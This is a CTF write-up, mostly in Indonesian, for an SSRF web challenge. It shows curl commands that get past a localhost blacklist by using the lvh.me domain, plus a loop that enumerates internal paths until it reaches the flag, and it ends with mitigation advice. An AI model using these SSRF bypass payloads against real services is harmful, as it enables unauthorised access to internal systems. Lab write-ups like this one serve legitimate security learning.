# Loopback Lens - CTF Writeup

## Challenge Information

**Challenge Name:** Loopback Lens
**Category:** Web Exploitation
**Vulnerability:** Server-Side Request Forgery (SSRF)

**Flag:**

```
0xV01D{decimal_loopback_makes_filters_cry}
```

---

## Description

Challenge memberikan sebuah aplikasi bernama **Loopback Lens** yang menyediakan fitur untuk mengambil halaman web melalui endpoint:

```
/lens?url=<target>
```

Clue yang diberikan:

```
SSRF
```

Terdapat informasi bahwa sebuah **private calibration route** hanya dapat diakses dari dalam mesin.

Target utama adalah memanfaatkan SSRF untuk mengakses service internal yang tidak dapat diakses langsung dari luar.

---

## 1. Reconnaissance

Pertama melakukan pengecekan halaman utama.

```bash
curl http://35.192.106.100:21001/
```

Response:

```html
<h1>Loopback Lens</h1>

<p>
The lens fetches public pages through /lens?url=...
</p>

<p>
A private calibration route exists inside the machine, but the filter refuses the obvious localhost names.
</p>
```

Dari informasi tersebut dapat disimpulkan:

- Endpoint `/lens` melakukan HTTP request ke URL yang diberikan user.
- Terdapat filter terhadap localhost.
- Dibutuhkan bypass SSRF untuk mengakses localhost.

---

## 2. SSRF Validation

Percobaan langsung menggunakan localhost:

```bash
curl "http://35.192.106.100:21001/lens?url=http://127.0.0.1:8080/"
```

Response:

```
blocked
```

Artinya filter berhasil mendeteksi string localhost.

---

## 3. Bypass Localhost Filter Menggunakan lvh.me

`lvh.me` merupakan domain yang selalu resolve ke:

```
127.0.0.1
```

Tetapi tidak mengandung string localhost yang diblokir.

Payload:

```bash
curl "http://35.192.106.100:21001/lens?url=http://lvh.me:8080/"
```

Response:

```html
<title>Loopback Lens</title>
```

Berarti SSRF berhasil dan service internal port 8080 dapat diakses.

---

## 4. Enumerasi Internal Route

Setelah mendapatkan akses SSRF, dilakukan pencarian endpoint internal.

Beberapa endpoint dicoba:

```
/calibrate
/calibration
/private
/internal
/admin
/debug
/status
```

Namun semuanya menghasilkan:

```
fetch failed: HTTPError
```

Kemudian dilakukan pengecekan endpoint health:

```bash
curl "http://35.192.106.100:21001/lens?url=http://lvh.me:8080/healthz"
```

Response:

```html
<pre>ok</pre>
```

Service internal aktif.

---

## 5. Mencari Private Calibration Route

Karena clue menyebutkan:

```
private calibration route
```

maka dilakukan enumerasi beberapa kemungkinan path.

Payload:

```bash
for p in /flag /getflag /secret/flag /admin/flag /internal/flag /private/flag /_debug /hidden;
do
echo $p
curl -s "http://35.192.106.100:21001/lens?url=http://lvh.me:8080$p"
done
```

Hasil:

```
/internal/flag

<pre>0xV01D{decimal_loopback_makes_filters_cry}</pre>
```

Flag berhasil ditemukan.

---

## 6. Exploit Chain

Alur eksploitasi:

```
External User
      |
      v
/lens?url=
      |
      v
SSRF Vulnerability
      |
      v
lvh.me
      |
      v
127.0.0.1:8080
      |
      v
/internal/flag
      |
      v
FLAG
```

---

## 7. Lessons Learned

Kerentanan utama adalah **SSRF (Server-Side Request Forgery)**.

Aplikasi hanya melakukan blacklist terhadap hostname tertentu seperti:

```
localhost
127.0.0.1
```

Namun pendekatan blacklist mudah dilewati menggunakan alternatif representasi hostname seperti:

```
lvh.me
```

yang tetap mengarah ke localhost.

Mitigasi yang seharusnya dilakukan:

- Gunakan allowlist domain tujuan.
- Validasi IP setelah DNS resolution.
- Blok private IP ranges:
  - 127.0.0.0/8
  - 10.0.0.0/8
  - 172.16.0.0/12
  - 192.168.0.0/16
- Hindari hanya melakukan blacklist string.

---

## Final Flag

```
0xV01D{decimal_loopback_makes_filters_cry}
```

